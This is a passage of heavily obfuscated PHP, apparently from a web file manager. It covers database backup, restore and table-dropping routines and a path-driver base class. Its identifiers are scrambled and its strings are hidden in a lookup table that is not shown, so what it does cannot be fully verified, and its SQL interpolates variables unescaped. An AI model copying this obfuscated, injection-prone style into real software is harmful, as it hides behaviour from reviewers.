$Cîİ¢¢–å[712]) { $có¼²â‘†Ì[$Cîİ¢¢–å[877]] .= $Cîİ¢¢–å[963] . $cÒËä„“±; } goto F¹İÜŞÌÛ®; Cæ„Ù·Äõ: $this->database = $có¼²â‘†Ì; $e´šø‘ÛóÖ = $this->model()->db(); $cÏÎñíøœ = $e´šø‘ÛóÖ->execute("\163\x68\157\167\40\144\x61\164\x61\x62\x61\163\145\163\40\x6c\x69\x6b\145\x20\x27{$cÒËä„“±}\x27"); goto E×ÂíÙ‹æÃ; a¥‘œ¡Â: $cÒËä„“± = $có¼²â‘†Ì[$Cîİ¢¢–å[230]]; $có¼²â‘†Ì[$Cîİ¢¢–å[230]] = $Cîİ¢¢–å[33]; if ($có¼²â‘†Ì[$Cîİ¢¢–å[878]] == $Cîİ¢¢–å[712]) { $b¹¨è°ÄÁ× = $có¼²â‘†Ì[$Cîİ¢¢–å[877]]; $có¼²â‘†Ì[$Cîİ¢¢–å[877]] = substr($b¹¨è°ÄÁ×, 0, strrpos($b¹¨è°ÄÁ×, $Cîİ¢¢–å[963])); } goto Cæ„Ù·Äõ; F¹İÜŞÌÛ®: $this->database = $có¼²â‘†Ì; $e´šø‘ÛóÖ->execute("\165\163\145\x20\140{$cÒËä„“±}\x60"); return $e´šø‘ÛóÖ; goto eíŠŠ¯½; B¦Š ºĞ”á: $Cîİ¢¢–å =& $_SERVER[»„]; $có¼²â‘†Ì = $this->database; if ($this->type == $Cîİ¢¢–å[9] || !$DÎß¸ñ«Ö) { return $this->model()->db(); } goto a¥‘œ¡Â; eíŠŠ¯½: } public function createTable($Bƒ¬ÅŒÄõ, $FÛŠ†Íù„± = null) { $A«ÚòÍô¤ =& $_SERVER[»„]; if (!IO::exist($Bƒ¬ÅŒÄõ)) { show_json(LNG($A«ÚòÍô¤[964]), !1); } $B¾İÈ†ºæ÷ = sqlSplit(IO::getContent($Bƒ¬ÅŒÄõ)); foreach ($B¾İÈ†ºæ÷ as $BÇ„¡Ü†ã) { if ($FÛŠ†Íù„±) { $cƒÔâ–Ø¸ = stripos($BÇ„¡Ü†ã, $A«ÚòÍô¤[965]) === 0; if ($cƒÔâ–Ø¸) { $FÛŠ†Íù„±->task[$A«ÚòÍô¤[966]] += 1; } } $this->model()->db()->execute($BÇ„¡Ü†ã); if ($FÛŠ†Íù„± && $cƒÔâ–Ø¸) { $C˜Â²¤¹ÁÚ = $A«ÚòÍô¤[967]; preg_match($C˜Â²¤¹ÁÚ, $BÇ„¡Ü†ã, $eœ›Ñ´ÜÊò); $FÛŠ†Íù„±->task[$A«ÚòÍô¤[968]] = trim($e¿’ÇÂšÀ[0], $A«ÚòÍô¤[814]); $FÛŠ†Íù„±->update(1); } } $this->taskToCache($FÛŠ†Íù„±); } public function insertTable($bƒØ—ÓÜÖá, $E…éøÖØõ’ = null) { $D‡¨“’Šù =& $_SERVER[»„]; foreach ($bƒØ—ÓÜÖá as $E×£šçÉÊ) { $F¬óó÷µ¨ = basename($E×£šçÉÊ); $F¬óó÷µ¨ = substr($F¬óó÷µ¨, 0, strrpos($F¬óó÷µ¨, $D‡¨“’Šù[91])); if ($E…éøÖØõ’) { $E…éøÖØõ’->task[$D‡¨“’Šù[968]] = $F¬óó÷µ¨; } if (get_filesize($E×£šçÉÊ) == 0) { continue; } $C¯äó©‰ÆÃ = $this->sqlToDb($E×£šçÉÊ, $E…éøÖØõ’); if (!$C¯äó©‰ÆÃ) { show_json(LNG($D‡¨“’Šù[969]) . "\x5b{$F¬óó÷µ¨}\135", !1); } } $this->taskToCache($E…éøÖØõ’); } public function sqlFromDb($cëÚ»Íå³Å, $a°™ÊªÏ¢Á, $AÍÛİÂÈã£ = null, $bÕ±Å«‹ŞÃ = null) { goto DÙéğˆÃìÈ; c”ÖÔ´ê—†: $eÒîòãÇ…Ş = $FŒÑÛº«‘->getPk(); $dÇø¤¿æ  = $FŒÑÛº«‘->getDbFields(); do { $bõñİ˜ˆƒª = $FŒÑÛº«‘->field($dÇø¤¿æ )->order($eÒîòãÇ…Ş . $_SERVER[»„][971])->selectPage($CâğìÀø„œ, $CØÖÎŠ¼éì); $Cè©ÜÁÉ˜ = !empty($bõñİ˜ˆƒª[$_SERVER[»„][350]]) ? $bõñİ˜ˆƒª[$_SERVER[»„][350]] : array(); if (!($b¤ª¢’­•ì = count($Cè©ÜÁÉ˜))) { break; } if ($AÍÛİÂÈã£) { $AÍÛİÂÈã£->task[$_SERVER[»„][966]] += $b¤ª¢’­•ì; } $D¬¾ÄîÄŠ‚ = array(); foreach ($Cè©ÜÁÉ˜ as $B˜ø…¦¬è…) { if ($bÕ±Å«‹ŞÃ) { $B˜ø…¦¬è…[$_SERVER[»„][75]] = "\173\151\157\x3a{$bÕ±Å«‹ŞÃ}\x7d" . substr($B˜ø…¦¬è…[$_SERVER[»„][75]], strlen("\x7b\151\157\72{$B˜ø…¦¬è…[$_SERVER[»„][731]]}\175")); $B˜ø…¦¬è…[$_SERVER[»„][731]] = $bÕ±Å«‹ŞÃ; } $D¬¾ÄîÄŠ‚[] = $_SERVER[»„][972] . $this->sqlEncode($B˜ø…¦¬è…) . $_SERVER[»„][973]; } $aÎ•ˆ¾è¿« = "\x49\116\x53\105\122\x54\40\111\116\124\117\40\140{$cëÚ»Íå³Å}\x60\40\50\140" . implode($_SERVER[»„][974], $dÇø¤¿æ ) . $_SERVER[»„][975]; fwrite($d­ŒÈ•Šçœ, $aÎ•ˆ¾è¿« . implode($_SERVER[»„][976], $D¬¾ÄîÄŠ‚) . $_SERVER[»„][67] . PHP_EOL); $CØÖÎŠ¼éì++; $dÜ°‹Ûâ‰… += $b¤ª¢’­•ì; if ($AÍÛİÂÈã£) { $AÍÛİÂÈã£->update($b¤ª¢’­•ì); } } while ($b¤ª¢’­•ì == $CâğìÀø„œ); goto a×Î¼±Éâï; dÅ¬ªªŞ³: $CØÖÎŠ¼éì = 1; $CâğìÀø„œ = 500; $d­ŒÈ•Šçœ = fopen($a°™ÊªÏ¢Á, $_SERVER[»„][970]); goto c”ÖÔ´ê—†; DÙéğˆÃìÈ: if ($AÍÛİÂÈã£) { $AÍÛİÂÈã£->task[$_SERVER[»„][968]] = $cëÚ»Íå³Å; } $FŒÑÛº«‘ = $this->model($cëÚ»Íå³Å); $dÜ°‹Ûâ‰… = 0; goto dÅ¬ªªŞ³; a×Î¼±Éâï: fclose($d­ŒÈ•Šçœ); return $dÜ°‹Ûâ‰…; goto C èƒ‹ò™œ; C èƒ‹ò™œ: } public function sqlToDb($b‚ËŒÃ¿–, $d÷×Ó†„Ğ = null) { goto B§á±¼è¶; F¾çµ‹š¸: if (!$fåø§¶ºğÙ) { return !1; } $dğ­áÊ÷¢‹ = 0; $BØŒ©Éäğ = $c²÷¥•¿¨[33]; goto fğùŒ°º–š; fğùŒ°º–š: $C·°Ú×‰Õ = 500 + 1; while (!feof($fåø§¶ºğÙ)) { if ($d÷×Ó†„Ğ && $dğ­áÊ÷¢‹ != 0) { $d÷×Ó†„Ğ->task[$c²÷¥•¿¨[966]] += 1; } $dğ­áÊ÷¢‹++; $DÍó·ÄÁÌ = trim(fgets($fåø§¶ºğÙ)); $BØŒ©Éäğ .= $c²÷¥•¿¨[50] . $this->sqlDecode($DÍó·ÄÁÌ, $this->type); if ($dğ­áÊ÷¢‹ == $C·°Ú×‰Õ) { $BØŒ©Éäğ = rtrim(trim($BØŒ©Éäğ), $c²÷¥•¿¨[67]); if (!$aóù®½´°•->execute($BØŒ©Éäğ)) { return !1; } if ($d÷×Ó†„Ğ) { $d÷×Ó†„Ğ->update($dğ­áÊ÷¢‹ - 1); } $BØŒ©Éäğ = $c²÷¥•¿¨[33]; $dğ­áÊ÷¢‹ = 0; } } fclose($fåø§¶ºğÙ); goto f¼Ş¡ï¾±; f¼Ş¡ï¾±: if ($BØŒ©Éäğ) { $BØŒ©Éäğ = rtrim(trim($BØŒ©Éäğ), $c²÷¥•¿¨[67]); if (!$aóù®½´°•->execute($BØŒ©Éäğ)) { return !1; } if ($d÷×Ó†„Ğ) { $d÷×Ó†„Ğ->update($dğ­áÊ÷¢‹ - 1); } } return !0; goto CÙÚºÛÔëá; B§á±¼è¶: $c²÷¥•¿¨ =& $_SERVER[»„]; $aóù®½´°• = $this->model()->db(); $fåø§¶ºğÙ = @fopen($b‚ËŒÃ¿–, $c²÷¥•¿¨[977]); goto F¾çµ‹š¸; CÙÚºÛÔëá: } public function dropTable($F‰Á…È´İ• = null) { $Eöµ™õè¦… = $this->model()->db(); $a­“ïËˆº = $F‰Á…È´İ• ? array($F‰Á…È´İ•) : $Eöµ™õè¦…->getTables(); if (!$a­“ïËˆº) { return; } foreach ($a­“ïËˆº as $F‰Á…È´İ•) { $Eöµ™õè¦…->execute("\144\162\x6f\x70\x20\x74\141\x62\x6c\145\x20\151\x66\40\x65\x78\151\163\164\163\40\x60{$F‰Á…È´İ•}\x60"); } } private function taskToCache($CÓ•§±«Ó½ = null) { $AâåöÆ«¡æ =& $_SERVER[»„]; if (!$CÓ•§±«Ó½) { return; } $AïØ²Ç©Çà = array($AâåöÆ«¡æ[968] => $CÓ•§±«Ó½->task[$AâåöÆ«¡æ[968]], $AâåöÆ«¡æ[966] => $CÓ•§±«Ó½->task[$AâåöÆ«¡æ[966]], $AâåöÆ«¡æ[978] => $CÓ•§±«Ó½->task[$AâåöÆ«¡æ[978]]); if ($AïØ²Ç©Çà[$AâåöÆ«¡æ[966]] == $AïØ²Ç©Çà[$AâåöÆ«¡æ[978]]) { $AïØ²Ç©Çà[$AâåöÆ«¡æ[684]] = 1; } Cache::set($AâåöÆ«¡æ[979] . $CÓ•§±«Ó½->task[$AâåöÆ«¡æ[363]], $AïØ²Ç©Çà); $CÓ•§±«Ó½->end(); } private function sqlEncode($D˜ê•ÖÕé) { $dßİÅ×î“ë =& $_SERVER[»„]; $BÕŒ‡Š¥ = array(); foreach ($D˜ê•ÖÕé as $A•é§±ÙÒ¸) { if (is_array($A•é§±ÙÒ¸)) { $A•é§±ÙÒ¸ = json_encode_force($A•é§±ÙÒ¸); } $A•é§±ÙÒ¸ = addslashes($A•é§±ÙÒ¸); $A•é§±ÙÒ¸ = str_replace(array($dßİÅ×î“ë[980], $dßİÅ×î“ë[213]), array($dßİÅ×î“ë[981], $dßİÅ×î“ë[982]), $A•é§±ÙÒ¸); $BÕŒ‡Š¥[] = str_replace($dßİÅ×î“ë[55], $dßİÅ×î“ë[983], $A•é§±ÙÒ¸); } return $dßİÅ×î“ë[55] . implode($dßİÅ×î“ë[984], $BÕŒ‡Š¥) . $dßİÅ×î“ë[55]; } private function sqlDecode($b£ÉøŠå†, $d¡–ÄÀÅ—ß) { $fµÖä’àò† =& $_SERVER[»„]; $b£ÉøŠå† = str_replace(array($fµÖä’àò†[981], $fµÖä’àò†[982]), array($fµÖä’àò†[980], $fµÖä’àò†[213]), $b£ÉøŠå†); if ($d¡–ÄÀÅ—ß == $fµÖä’àò†[9]) { $b£ÉøŠå† = stripslashes($b£ÉøŠå†); } return $b£ÉøŠå†; } } goto FŒ‡†´ÍÛ; E¿–ÁàÈÅ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $b†‹Ã“œ†˜ =& $_SERVER[»„]; $this->objectDriver = array($b†‹Ã“œ†˜[57], $b†‹Ã“œ†˜[58], $b†‹Ã“œ†˜[59], $b†‹Ã“œ†˜[60], $b†‹Ã“œ†˜[61], $b†‹Ã“œ†˜[62], $b†‹Ã“œ†˜[63], $b†‹Ã“œ†˜[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($E·æÖ…í‚æ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($E·æÖ…í‚æ, $_SERVER[»„][8]); } return $E·æÖ…í‚æ; } public function getPathName($DÑ¤ÚçÜß ) { return $DÑ¤ÚçÜß ; } public function iconvApp($CÈ±„²«¤ò) { return $CÈ±„²«¤ò; } public function iconvSystem($BøÛ™Ï»ÜØ) { return $BøÛ™Ï»ÜØ; } public function iconvTo($C±íæ©¨, $cÃº‚“ºÔ, $F¶›³ØÓ‹–) { goto AøÏ¼†òä˜; aÈë†ßìÏ: $eÀ×ïŒ»‰ƒ[$F¶›³ØÓ‹– . $cÁ‡šå„[66] . $cÃº‚“ºÔ . $cÁ‡šå„[67] . $C±íæ©¨] = $C±íæ©¨; $eÀ×ïŒ»‰ƒ[$F¶›³ØÓ‹– . $cÁ‡šå„[66] . $cÃº‚“ºÔ . $cÁ‡šå„[67] . $dÕÆ®òƒ«] = $C±íæ©¨; $eÀ×ïŒ»‰ƒ[$cÃº‚“ºÔ . $cÁ‡šå„[66] . $F¶›³ØÓ‹– . $cÁ‡šå„[67] . $dÕÆ®òƒ«] = $dÕÆ®òƒ«; goto Aëğéè¢ê; Aëğéè¢ê: return $dÕÆ®òƒ«; goto FØµÂ«âŒ–; aƒÜ‰³ˆÔŒ: $dÕÆ®òƒ« = $dÕÆ®òƒ« ? $dÕÆ®òƒ« : $C±íæ©¨; if (strstr($dÕÆ®òƒ«, $cÁ‡šå„[69])) { $dÕÆ®òƒ« = str_replace($cÁ‡šå„[69], $cÁ‡šå„[70], $dÕÆ®òƒ«); } $eÀ×ïŒ»‰ƒ[$cÃº‚“ºÔ . $cÁ‡šå„[66] . $F¶›³ØÓ‹– . $cÁ‡šå„[67] . $C±íæ©¨] = $dÕÆ®òƒ«; goto aÈë†ßìÏ; f›­‰¬ÚÓ¬: $d´¡´ìö¹× = $cÃº‚“ºÔ . $cÁ‡šå„[66] . $F¶›³ØÓ‹– . $cÁ‡šå„[67] . $C±íæ©¨; if (isset($eÀ×ïŒ»‰ƒ[$d´¡´ìö¹×])) { return $eÀ×ïŒ»‰ƒ[$d´¡´ìö¹×]; } if (function_exists($cÁ‡šå„[68])) { $dÕÆ®òƒ« = @mb_convert_encoding($C±íæ©¨, $F¶›³ØÓ‹–, $cÃº‚“ºÔ); } else { $dÕÆ®òƒ« = @iconv($cÃº‚“ºÔ, $F¶›³ØÓ‹–, $C±íæ©¨); } goto aƒÜ‰³ˆÔŒ; AøÏ¼†òä˜: $cÁ‡šå„ =& $_SERVER[»„]; if (!$C±íæ©¨ || !function_exists($cÁ‡šå„[65])) { return $C±íæ©¨; } static $eÀ×ïŒ»‰ƒ = array(); goto f›­‰¬ÚÓ¬; FØµÂ«âŒ–: } public function getPathInner($AĞ·â£¨¬ã) { $fë²¼é»Ìã = IO::init($AĞ·â£¨¬ã); return $fë²¼é»Ìã->path; } public function getPathOuter($C¶ø‰–¢øË) { $FáùÂ…ëª… =& $_SERVER[»„]; $D™¯Ü­×¾Ğ = strlen(trim($this->pathBase, $FáùÂ…ëª…[8])); $C¶ø‰–¢øË = substr(trim($C¶ø‰–¢øË, $FáùÂ…ëª…[8]), $D™¯Ü­×¾Ğ); return $this->pathDriver . $FáùÂ…ëª…[8] . ltrim($C¶ø‰–¢øË, $FáùÂ…ëª…[8]); } public function isParentOf($eº§¤Å…Ø, $e“£çÉÅ×ë) { $døÙßÆº–¤ =& $_SERVER[»„]; $eº§¤Å…Ø = rtrim(strtolower($eº§¤Å…Ø), $døÙßÆº–¤[8]) . $døÙßÆº–¤[8]; $e“£çÉÅ×ë = rtrim(strtolower($e“£çÉÅ×ë), $døÙßÆº–¤[8]) . $døÙßÆº–¤[8]; $EÄäé‹çØ = strpos($e“£çÉÅ×ë, $eº§¤Å…Ø) === 0; return $EÄäé‹çØ; } public function getType() { $C¬ğµ‰ÌóÍ =& $_SERVER[»„]; $AºâË²²¹Ü = str_replace($C¬ğµ‰ÌóÍ[71], $C¬ğµ‰ÌóÍ[33], get_class($this)); return strtolower($AºâË²²¹Ü); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($E³™á©§›Ø, $dëÅÒ˜¿¡Í) { $BàŞ±Šğšç =& $_SERVER[»„]; $f¤œ¨ Èèò = rtrim($E³™á©§›Ø, $BàŞ±Šğšç[8]) . $BàŞ±Šğšç[8] . $dëÅÒ˜¿¡Í; $DÅß±‘æä„ = $this->exist($f¤œ¨ Èèò); return $DÅß±‘æä„ ? $f¤œ¨ Èèò : !1; } public function renameObject($B¼šöˆ‹ö„, $EÖÓ¹š„á) { goto A¾Âµ³º‹; e›íÅ„ºÌ™: $B¼šöˆ‹ö„ = $this->getPathOuter($B¼šöˆ‹ö„); $EÖÓ¹š„á = $this->pathFather($B¼šöˆ‹ö„) . $EÖÓ¹š„á; if (IO::isFile($B¼šöˆ‹ö„)) { $dêŒÕ¹Â§ƒ = IO::copy($B¼šöˆ‹ö„, $this->pathFather($B¼šöˆ‹ö„), REPEAT_RENAME_FOLDER, $C„ÅÖØØ±Š); if ($dêŒÕ¹Â§ƒ) { IO::remove($B¼šöˆ‹ö„); } } else { $dêŒÕ¹Â§ƒ = IO::mkdir($EÖÓ¹š„á); if (!$dêŒÕ¹Â§ƒ) { return !1; } $D­Ú ä²¢ = IO::listPath($B¼šöˆ‹ö„, !0); $DÕ×ºí«‹ö = array_merge($D­Ú ä²¢[$Aåßìö¬–‚[73]], $D­Ú ä²¢[$Aåßìö¬–‚[74]]); foreach ($DÕ×ºí«‹ö as $AÜ„æ¨°è) { IO::move($AÜ„æ¨°è[$Aåßìö¬–‚[75]], $EÖÓ¹š„á, REPEAT_RENAME_FOLDER); } IO::remove($B¼šöˆ‹ö„); } goto døŒÈ²…å; døŒÈ²…å: return $dêŒÕ¹Â§ƒ ? $EÖÓ¹š„á : !1; goto AØ‰»‚õ´°; A¾Âµ³º‹: $Aåßìö¬–‚ =& $_SERVER[»„]; $C„ÅÖØØ±Š = $EÖÓ¹š„á; Hook::trigger($Aåßìö¬–‚[72], $this, $B¼šöˆ‹ö„, $this, $this->pathFather($B¼šöˆ‹ö„) . $EÖÓ¹š„á); goto e›íÅ„ºÌ™; AØ‰»‚õ´°: } public function tempFile($bœ·ë½ î = '', $bÀ†©İŠÛÒ = '') { goto bÊàæ¯¯Ñ; D¬¯ÉÎ¤: return $A¥˜ö®¡ß÷; goto bŠëÁßÉö; bÊàæ¯¯Ñ: if (!$bœ·ë½ î) { $bœ·ë½ î = rand_string(15); } $aÉâ¤‡ÒŠ = TEMP_FILES . rand_string(15) . $_SERVER[»„][8]; @mkdir($aÉâ¤‡ÒŠ, 511, !0); goto Fİá½°£öñ; Fİá½°£öñ: $A¥˜ö®¡ß÷ = $aÉâ¤‡ÒŠ . $bœ·ë½ î; @touch($A¥˜ö®¡ß÷); if ($bÀ†©İŠÛÒ) { file_put_contents($A¥˜ö®¡ß÷, $bÀ†©İŠÛÒ); } goto D¬¯ÉÎ¤; bŠëÁßÉö: } public function tempFileRemve($dÉ«¾±Ÿ„) { @unlink($dÉ«¾±Ÿ„); @rmdir($this->pathFather($dÉ«¾±Ÿ„)); } public function mkfile($bƒ”øÍ‚÷ª, $e‘öÌ»¡Ì® = '', $Cš»õàĞ—À = REPEAT_RENAME) { } public function mkdir($F½…“¯”´, $E×È°‚œŠÂ = REPEAT_SKIP) { } public function copyFile($F¿£ŒÔ©ğ¦, $fê†«ˆ –§) { } public function moveFile($d­ËÙ’˜ù®, $CŞÓÄİ«˜) { } public function remove($D³»Ëî†áÙ) { if ($this->isFile($D³»Ëî†áÙ)) { return $this->delFile($D³»Ëî†áÙ); } return $this->delFolder($D³»Ëî†áÙ); } public function rename($f·¿ÌŒ·Şñ, $e¾Ì†ÇÛ“©) { } public function exist($aô—Îƒó‘†) { } public function findByHash($EÚºœ®¯õƒ = '', $E² ÆğÚ…ô = '') { return !1; } public function isFile($CÎ³”¦Ç¼î) { } public function isFolder($CãšÇ«Õˆó) { } public function size($EÇêø‘ªÉ) { } public function info($B¤‚§±ÈÖé) { } public function infoSimple($aÃ‰éØÛ¿Ô) { return $this->info($aÃ‰éØÛ¿Ô); } public function infoAuth($C×µöè–‰¤) { return $this->info($C×µöè–‰¤); } public function infoFull($c¬Ë‰¦Ø¼å) { return $this->info($c¬Ë‰¦Ø¼å); } public function infoWithChildren($DÓ‰å «‘˜) { $b˜ÙÈôÛ³ =& $_SERVER[»„]; $bÀ„ï‚õ = $this->info($DÓ‰å «‘˜); if ($bÀ„ï‚õ && $bÀ„ï‚õ[$b˜ÙÈôÛ³[29]] == $b˜ÙÈôÛ³[76]) { $AšˆŒ­å¢ = array($b˜ÙÈôÛ³[77] => 0, $b˜ÙÈôÛ³[78] => 0, $b˜ÙÈôÛ³[79] => 0); $this->infoChildren($DÓ‰å «‘˜, $AšˆŒ­å¢); $bÀ„ï‚õ[$b˜ÙÈôÛ³[77]] = $AšˆŒ­å¢[$b˜ÙÈôÛ³[77]]; $bÀ„ï‚õ[$b˜ÙÈôÛ³[80]] = array($b˜ÙÈôÛ³[81] => $AšˆŒ­å¢[$b˜ÙÈôÛ³[78]], $b˜ÙÈôÛ³[82] => $AšˆŒ­å¢[$b˜ÙÈôÛ³[79]]); } return $bÀ„ï‚õ; } public function listPath($D‘‹¸ÕğìË, $A¸Óª°óØ­ = false) { } public function has($c¦â¯ƒŒµæ, $Aæ¥…ÚïĞ = false, $fÚÍÉƒ¿µ™ = false) { } public function canRead($d¶ ÈàÓ³Î) { } public function canWrite($EÛòÑ±ÜÇ) { } public function getContent($Fåô½Ç§àó) { } public function setContent($C¿¥İÆÓÉ, $Cù«İ³Û‘â = '') { } protected function infoChildren($Bëˆ¼„¦»Š, &$cÈ²Éš”¥½) { $d¯í‘ÖŠ¨ =& $_SERVER[»„]; check_abort(); $eêÑÚŒëÄ = $this->listPath($Bëˆ¼„¦»Š, !0); $eêÑÚŒëÄ = array_merge($eêÑÚŒëÄ[$d¯í‘ÖŠ¨[74]], $eêÑÚŒëÄ[$d¯í‘ÖŠ¨[73]]); foreach ($eêÑÚŒëÄ as $aœÚìƒ•Áà) { if ($aœÚìƒ•Áà[$d¯í‘ÖŠ¨[29]] == $d¯í‘ÖŠ¨[76]) { $cÈ²Éš”¥½[$d¯í‘ÖŠ¨[79]]++; $aé¨ã×ÌŒ° = $this->getPathInner($aœÚìƒ•Áà[$d¯í‘ÖŠ¨[75]]); $this->infoChildren($aé¨ã×ÌŒ°, $cÈ²Éš”¥½); } else { $cÈ²Éš”¥½[$d¯í‘ÖŠ¨[78]]++; $cÈ²Éš”¥½[$d¯í‘ÖŠ¨[77]] += $aœÚìƒ•Áà[$d¯í‘ÖŠ¨[77]]; } } } public function fileSubstr($bÒÅŒÂè», $BÔŒÔÇ‹ëŠ, $c––Ü¯åÊğ) { } public function listAll($bñ‹ÛêÃÛ) { } public function upload($fó×¤»àá, $Bùº‘­·¹, $fİ¸ÈÑôò› = false, $C¼ĞçÀÍâÎ = REPEAT_REPLACE) { } public function uploadFileByID($aÌè¹ˆõ§Œ, $Cá¨²«÷µ, $A‰¦ğ°ğ³) { } public function uploadFileByPath($dµÄ¹°¤Üš, $Fêù­µôä, $EÊ‘‹ØĞŠÊ = array()) { } public function isUploadServer() { $dß‰‡ÉÈİ =& $_SERVER[»„]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $dß‰‡ÉÈİ[83]) { return !0; } return $GLOBALS[$dß‰‡ÉÈİ[6]][$dß‰‡ÉÈİ[84]][$dß‰‡ÉÈİ[85]]; } public function isFileOutServer() { $dÅç†Â×‘ƒ =& $_SERVER[»„]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $dÅç†Â×‘ƒ[83]) { return !0; } return $GLOBALS[$dÅç†Â×‘ƒ[6]][$dÅç†Â×‘ƒ[84]][$dÅç†Â×‘ƒ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($DÄé­äÍøá) { $fÊÍÚäŒ© =& $_SERVER[»„]; if (!$this->isCdnHost()) { return $DÄé­äÍøá; } return str_replace(trim(get_url_root($DÄé­äÍøá), $fÊÍÚäŒ©[8]), trim($this->cdnHost, $fÊÍÚäŒ©[8]), $DÄé­äÍøá); } public function uploadLink($cŞÉêå˜Á, $DäŠ™¨÷‰­ = 0) { goto fïÌñŠÇÅñ; fïÌñŠÇÅñ: $b‚†ÜÒÓÌÙ =& $_SERVER[»„]; if ($this->isUploadServer()) { return; } $E‘„×Ïì’µ = $this->getType(); goto FêÆ¡–ƒœ; FêÆ¡–ƒœ: if (!in_array($E‘„×Ïì’µ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $c¼¶Œ¹¾“ = 1024 * 1024 * 10; goto C™»Œš‚”À; EçÏÓ¶½‘Ü: if ($Fí¥ˆÉšø•) { $Fí¥ˆÉšø•[$b‚†ÜÒÓÌÙ[89]] = $cŞÉêå˜Á; $Fí¥ˆÉšø•[$b‚†ÜÒÓÌÙ[90]] = $E‘„×Ïì’µ; } return $Fí¥ˆÉšø•; goto e‹á¹«íå¬; C™»Œš‚”À: $D†Ô›Ğˆ´¡ = $DäŠ™¨÷‰­ <= $c¼¶Œ¹¾“ ? $b‚†ÜÒÓÌÙ[87] : $b‚†ÜÒÓÌÙ[88]; $cè„‰ĞÃ¼£ = (!$DäŠ™¨÷‰­ ? 1 : ceil($DäŠ™¨÷‰­ / pow(1024, 3))) * 3600 * 4; $Fí¥ˆÉšø• = $this->{$D†Ô›Ğˆ´¡}($cŞÉêå˜Á, $cè„‰ĞÃ¼£); goto EçÏÓ¶½‘Ü; e‹á¹«íå¬: } public function uploadFormData($F¸İµÇöçÅ, $E°µ¸ÕÈÉÑ = 3600) { } public function multiUploadFormData($b¶ÈæÜ„Ó, $cÊ›©à¼İ° = 3600) { } public function download($B¨½ğÜ´„­, $Eê–ºÅËÑå) { } public function ext($BÍÆ‡‡ª„Ğ) { $F‘º‰•Œƒ÷ =& $_SERVER[»„]; if (strpos($BÍÆ‡‡ª„Ğ, $F‘º‰•Œƒ÷[8]) === -1) { $d£šµª•¥ğ = $BÍÆ‡‡ª„Ğ; } else { $d£šµª•¥ğ = $this->pathThis($BÍÆ‡‡ª„Ğ); } $AöÔÏÅàš = $F‘º‰•Œƒ÷[33]; if (strstr($d£šµª•¥ğ, $F‘º‰•Œƒ÷[91])) { $AöÔÏÅàš = substr($d£šµª•¥ğ, strrpos($d£šµª•¥ğ, $F‘º‰•Œƒ÷[91]) + 1); $AöÔÏÅàš = strtolower($AöÔÏÅàš); } if (strlen($AöÔÏÅàš) > 3 && preg_match($F‘º‰•Œƒ÷[92], $AöÔÏÅàš, $B¿Ë˜óÆ…«)) { $AöÔÏÅàš = $F‘º‰•Œƒ÷[33]; } return $AöÔÏÅàš; } public function pathThis($B’ìÀÀËºª) { $CÒ±øÊ¡æ’ =& $_SERVER[»„]; $B’ìÀÀËºª = str_replace($CÒ±øÊ¡æ’[93], $CÒ±øÊ¡æ’[8], rtrim($B’ìÀÀËºª, $CÒ±øÊ¡æ’[8])); $DšÚ¹“á¯ª = strrpos($B’ìÀÀËºª, $CÒ±øÊ¡æ’[8]); if ($DšÚ¹“á¯ª === !1) { return $B’ìÀÀËºª; } return substr($B’ìÀÀËºª, $DšÚ¹“á¯ª + 1); } public function pathFather($DÉÃõ˜ÁÓŠ) { $E‘¤·±¯ğ =& $_SERVER[»„]; $DÉÃõ˜ÁÓŠ = str_replace($E‘¤·±¯ğ[93], $E‘¤·±¯ğ[8], rtrim($DÉÃõ˜ÁÓŠ, $E‘¤·±¯ğ[8])); $fó¡»ˆç™© = strrpos($DÉÃõ˜ÁÓŠ, $E‘¤·±¯ğ[8]); if ($fó¡»ˆç™© === !1) { return $E‘¤·±¯ğ[33]; } return substr($DÉÃõ˜ÁÓŠ, 0, $fó¡»ˆç™© + 1); } public function hashSimple($eƒ…µî‘Š) { goto F–Ê¹Ç„à‚; A¾òÙ„˜Ÿ‡: $CùÌÈ“ƒÇ = intval($fÈ°ã¯öÂ / $A¨†¤†Ú˜£); $bÃËÃîÙÀÒ = $E©œØ•Ì¾²[33]; for ($EÚñˆ“ÚÂŞ = 0; $EÚñˆ“ÚÂŞ < $A¨†¤†Ú˜£; $EÚñˆ“ÚÂŞ++) { $bÃËÃîÙÀÒ .= $this->fileSubstr($eƒ…µî‘Š, $CùÌÈ“ƒÇ * $EÚñˆ“ÚÂŞ, $BÓâ…ÑÃÌ„); } goto D™ìÉ„Şğ; D™ìÉ„Şğ: $bÃËÃîÙÀÒ .= $this->fileSubstr($eƒ…µî‘Š, $fÈ°ã¯öÂ - $BÓâ…ÑÃÌ„, $BÓâ…ÑÃÌ„); return md5($bÃËÃîÙÀÒ) . $fÈ°ã¯öÂ; goto a†™˜µ»·; F–Ê¹Ç„à‚: $E©œØ•Ì¾² =& $_SERVER[»„]; if (!$eƒ…µî‘Š) { return md5($E©œØ•Ì¾²[33]); } $fÈ°ã¯öÂ = $this->size($eƒ…µî‘Š); goto e¡èµÆÖ­™; e¡èµÆÖ­™: $BÓâ…ÑÃÌ„ = 200; $A¨†¤†Ú˜£ = 50; if ($fÈ°ã¯öÂ <= $BÓâ…ÑÃÌ„ * $A¨†¤†Ú˜£) { return $this->hashMd5($eƒ…µî‘Š) . $fÈ°ã¯öÂ; } goto A¾òÙ„˜Ÿ‡; a†™˜µ»·: } public static $md5Cache = array(); public function hashMd5($CŠìâÏÓ«) { $CŠìâÏÓ« = $this->iconvSystem($CŠìâÏÓ«); if (isset(self::$md5Cache[$CŠìâÏÓ«])) { return self::$md5Cache[$CŠìâÏÓ«]; } self::$md5Cache[$CŠìâÏÓ«] = $this->hashMd5Shell($CŠìâÏÓ«); if (!self::$md5Cache[$CŠìâÏÓ«]) { self::$md5Cache[$CŠìâÏÓ«] = @md5_file($CŠìâÏÓ«); } return self::$md5Cache[$CŠìâÏÓ«]; } private function hashMd5Shell($b¼¦¦šÌ) { goto 